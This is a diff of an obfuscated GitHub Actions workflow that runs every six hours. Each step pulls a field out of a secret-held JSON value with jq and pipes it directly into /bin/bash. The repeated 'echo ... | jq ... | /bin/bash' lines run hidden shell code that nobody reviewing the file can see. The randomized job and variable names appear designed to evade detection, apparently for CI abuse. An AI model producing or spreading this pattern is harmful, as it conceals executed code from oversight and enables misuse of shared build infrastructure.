@@ -1,27 +1,29 @@
 name: shiximian1894
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
+    - cron: '10 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shiximian1894
         env:
-          h27482: ${{ secrets.h27482 }}
+          xzl846: ${{ secrets.xzl846 }}
         run: |
-          echo $h27482 | jq -r .je325 | /bin/bash
-          echo $zden01934 | jq -r .nifgn35816 | /bin/bash
-          echo $mb79939 | jq -r .vzipk6 | /bin/bash
-          echo $h158 | jq -r .vhv50 | /bin/bash
-          echo $pu72 | jq -r .ijzcv17 | /bin/bash
-          echo $xzc9 | jq -r .aoqu7183 | /bin/bash
-          echo $bfcee07960 | jq -r .bzlf4713 | /bin/bash
-          echo $v04188 | jq -r .ust19 | /bin/bash
-          echo $yvaok9 | jq -r .mv05 | /bin/bash
-          echo $rjpkl02476 | jq -r .r6 | /bin/bash
-          echo $j4312 | jq -r .gnum828 | /bin/bash
+          echo $xzl846 | jq -r .hlsgl16 | /bin/bash
+          echo $g7986 | jq -r .n4 | /bin/bash
+          echo $xwd08 | jq -r .ay024 | /bin/bash
+          echo $bes1697 | jq -r .ym2534 | /bin/bash
+          echo $kg305 | jq -r .xkf93 | /bin/bash
+          echo $rriy83 | jq -r .ofn48 | /bin/bash
+          echo $expku3400 | jq -r .tdlmk92474 | /bin/bash
+          echo $lkyg1057 | jq -r .auks82606 | /bin/bash
+          echo $tplnb47465 | jq -r .dapii78 | /bin/bash
+          echo $wvty19631 | jq -r .uy78741 | /bin/bash
+          echo $rg24 | jq -r .lkkfp3576 | /bin/bash
 
